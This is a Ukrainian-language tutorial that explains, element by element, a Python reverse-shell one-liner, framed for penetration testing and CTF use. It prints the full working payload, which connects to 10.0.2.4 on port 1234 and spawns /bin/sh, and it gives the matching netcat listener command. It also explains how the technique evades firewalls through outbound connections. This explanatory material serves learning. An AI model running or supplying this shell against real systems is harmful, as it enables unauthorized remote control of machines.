## Детальне пояснення команди:

```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```


Цей рядок коду на Python є класичним прикладом **інтрузивного зворотного шеллу (Reverse Shell)**, який часто використовується в кібербезпеці під час тестування на проникнення та CTF-змагань після успішного підняття привілеїв або експлуатації вразливостей (RCE).

Мета цієї команди — змусити цільову систему (сервер) самостійно підключитися назад до комп'ютера атакуючого (`10.0.2.4` на порт `1234`) і передати йому командний рядок (`/bin/sh`) з інтерактивними можливостями псевдотерміналу (`pty`).

Давайте розберемо цей скрипт покроково та детально.

### Анатомія команди по елементах

Команда передається інтерпретатору за допомогою прапорця **`-c`**, що дозволяє виконувати код Python безпосередньо як текстовий рядок без створення окремого `.py` файлу. Весь код розділений крапками з комою `;` для запису в один рядок.

#### 1. Імпорт необхідних модулів

```python
import socket, os, pty

```

* **`socket`** — бібліотека для роботи з мережевими підключеннями (TCP/UDP).
* **`os`** — модуль для взаємодії з операційною системою (керування дескрипторами файлів, процесами).
* **`pty`** — модуль для роботи з псевдотерміналами. Він критично важливий для створення *інтерактивного* шеллу (щоб коректно працювали автодоповнення по Tab, гарячі клавіші на кшталт `Ctrl+C` та утиліти на зразок `sudo` чи `su`).

#### 2. Створення та ініціалізація сокету

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

```

Тут створюється новий мережевий сокет:

* `socket.AF_INET` — вказує на використання протоколу IPv4.
* `socket.SOCK_STREAM` — вказує на використання надійного потокового протоколу **TCP** (це важливо, щоб команди та відповіді не губилися в мережі).

#### 3. Встановлення з'єднання з атакуючим

```python
s.connect(("10.0.2.4", 1234))

```

Модель ініціює вихідне з'єднання (TCP Handshake) до хоста з IP-адресою **`10.0.2.4`** на порт **`1234`**.

> На цій IP-адресі атакуючий заздалегідь запускає слухач (listener), зазвичай за допомогою утиліти Netcat: `nc -lvnp 1234`.

#### 4. Перенаправлення стандартних потоків (Дублювання дескрипторів)

```python
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

```

Функція `os.dup2(source, destination)` копіює дескриптор файлу. `s.fileno()` повертає числовий ідентифікатор створеного мережевого сокету.
В Linux кожен процес має три стандартні потоки:

* **`0` (stdin)** — стандартне введення (те, що ми пишемо в консоль).
* **`1` (stdout)** — стандартне виведення (текст, який програма повертає нам на екран).
* **`2` (stderr)** — стандартний потік помилок.

Ці три рядки буквально "прив'язують" введення, виведення та помилки системи до мережевого сокету. Після цього:

* Усе, що хакер пише у свій Netcat, автоматично потрапляє на вхід (`stdin`) майбутнього командного процесу.
* Усі відповіді та помилки системи (`stdout`/`stderr`) замість екрана сервера відправляються назад через мережу хакеру.

#### 5. Запуск оболонки всередині псевдотерміналу

```python
pty.spawn("/bin/sh")

```

Замість стандартного системного виклику `os.system` або `subprocess`, тут використовується метод `pty.spawn()`. Він запускає командну оболонку **`/bin/sh`**, але маскує її під повноцінний інтерактивний термінал (PTY). Це обходить обмеження звичайних "німих" шеллів (non-interactive shells) і дозволяє атакуючому відчувати себе так, ніби він підключився до сервера через SSH.

### Чому цей метод такий популярний у кібербезпеці?

1. **Обхід брандмауерів (Firewall Evasion):** Більшість корпоративних фаєрволів суворо блокують *вхідні* підключення (Inbound) на сервери ззовні. Проте, *вихідні* підключення (Outbound) зсередини сервера в інтернет часто дозволені (наприклад, для оновлення пакетів). Оскільки цей скрипт сам ініціює вихідний запит до хакера, захисні системи часто його пропускають.
2. **Наявність Python:** Інтерпретатор Python за замовчуванням встановлений майже на кожному сучасному сервері Linux (Ubuntu, Debian, CentOS), що робить цей скрипт універсальною зброєю "з коробки" (LOLBAS — Living Off The Land Binaries and Scripts).
